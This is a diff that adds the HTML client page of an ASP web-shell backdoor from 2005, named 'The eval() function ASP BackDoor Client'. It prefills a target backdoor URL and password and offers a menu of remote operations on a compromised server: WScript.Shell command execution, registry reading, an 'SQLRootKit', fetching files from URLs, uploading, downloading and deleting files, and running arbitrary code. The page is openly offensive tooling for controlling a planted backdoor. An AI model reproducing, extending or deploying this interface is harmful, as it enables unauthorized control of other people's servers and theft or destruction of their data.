@@ -1,0 +1,60 @@
+<!--
+Title:    The eval() function ASP BackDoor Client
+Author:   hanson1025
+Mail:     491889035@qq.com
+Site:     http://hanson1025.139.tofor.com/
+Version:  1.0
+Date:     2005-8-28
+-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>The eval() function ASP BackDoor Client</title>
+<link rel="stylesheet" type="text/css" href="func/lake2.css">
+</head>
+<body>
+<div align="center">Hanson Huang!</div>
+<table width="80%"  border="1" align="center">
+  <tr>
+    <td width="9%">The URL:</td>
+    <td width="71%">
+     <input name="url" type="text" value="http://localhost/newaspdoor/index.asp" size="60">    </td>
+    <td width="9%">Password:</td>
+    <td width="11%"><input name="pwd" type="text" value="hansoncn" size="10"></td>
+  </tr>
+  <tr>
+    <td>Function:</td>
+    <td colspan="3"><select name="select" onChange="fun.location='func/'+this.value+'.htm';">
+      <option value="about">ABOUT</option>
+      <option value="info">Server Variable</option>
+      <option value="drives">Get Drives</option>
+      <option value="list">File List</option>
+      <option value="copy">Copy File&amp;Folder</option>
+      <option value="edit">Edit TextFile</option>
+      <option value="new">New File&amp;Folder</option>
+      <option value="up">Upload TextFile</option>
+      <option value="down">DownLoad File</option>
+      <option value="del">Delete</option>
+      <option value="rename">Rename</option>
+      <option value="xml">UploadFile From URL</option>
+      <option value="cmd">WScript.Shell</option>
+      <option value="reg">ReadReg</option>
+      <option value="sql">SQLRootKit</option>
+      <option value="data">Database</option>
+      <option value="you">Your Code</option>
+    </select></td>
+  </tr>
+  <tr>
+  <td><input type="submit" name="Submit" value=" Send " onClick="fun.RUNonclick();"></td>
+  <td colspan="3">&nbsp;</td>
+  </tr>
+  <tr><td colspan="3">
+<iframe name="fun" src="func/about.htm" align="center" width="100%" frameborder="0" height="400"></iframe>
+</td></tr>
+</table>
+<hr>
+<div align="center"><br>
+CopyRight &copy; &nbsp;<a href="http://hanson1025.139.tofor.com/" target="_blank">hanson1025</a> </div>
+</body>
+</html>
